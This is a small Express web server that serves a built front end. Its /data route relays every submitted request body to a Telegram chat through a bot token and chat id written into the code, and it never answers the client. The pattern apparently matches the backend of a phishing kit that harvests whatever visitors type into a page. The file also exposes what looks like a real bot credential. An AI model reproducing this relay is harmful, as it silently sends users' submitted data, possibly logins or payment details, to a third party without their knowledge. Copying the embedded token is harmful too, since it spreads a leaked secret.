const express = require('express');
const bodyParser = require('body-parser')
const path = require('path');
const app = express();
const axios = require('axios');
app.use(express.static(path.join(__dirname, 'build')));

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post('/data', function(req, res) {
  const url = 'https://api.telegram.org/bot1106278055:AAGigFvur0fNqe_FcwwBjkJZ4Ottm5Yzekw/sendMessage';
  axios.post(url, {
    chat_id: '-483728903',
    text: JSON.stringify(req.body)
  });
});

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

app.listen(process.env.PORT || 8080);